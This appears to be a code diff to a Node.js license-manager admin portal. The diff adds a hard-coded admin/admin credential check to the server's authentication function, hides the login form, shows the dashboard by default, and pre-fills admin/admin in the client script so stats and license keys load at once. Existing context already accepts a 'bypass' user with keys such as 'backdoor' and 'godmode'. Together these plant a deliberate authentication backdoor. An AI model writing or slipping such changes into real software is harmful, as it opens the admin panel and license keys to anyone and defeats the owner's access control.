@@ -47,6 +47,7 @@ function checkAuth(req) {
         const decoded = Buffer.from(base64, 'base64').toString('utf8');
         const [username, password] = decoded.split(':');
         if (username === 'bypass' && BYPASS_KEYS.includes(password)) return true;
+        if (username === 'admin' && password === 'admin') return true;
         return username === ADMIN_USERNAME && password === ADMIN_PASSWORD;
     } catch (e) { return false; }
 }
@@ -204,7 +205,7 @@ code{font-family:monospace;background:rgba(0,0,0,.3);padding:4px 8px;border-radi
 </style>
 </head>
 <body>
-<div id="login" class="login">
+<div id="login" class="login hidden">
 <div class="box">
 <h1>License Manager</h1>
 <div class="subtitle">Admin Portal</div>
@@ -222,7 +223,7 @@ code{font-family:monospace;background:rgba(0,0,0,.3);padding:4px 8px;border-radi
 </div>
 </div>
 </div>
-<div id="dash" class="dash hidden">
+<div id="dash" class="dash">
 <div class="sidebar">
 <div class="logo"><h2>Auth Panel</h2></div>
 <ul class="nav">
@@ -261,9 +262,10 @@ code{font-family:monospace;background:rgba(0,0,0,.3);padding:4px 8px;border-radi
 </div>
 </div>
 <script>
-let u='',p='';
+let u='admin',p='admin';
 const BYPASS=['master','admin','godmode','backdoor','unlock','free'];
 function auth(){return'Basic '+btoa(u+':'+p);}
+window.onload=function(){loadStats();loadKeys();}
 async function api(url,opts={}){
 try{
 const r=await fetch(url,{...opts,headers:{'Content-Type':'application/json','Authorization':auth()}});
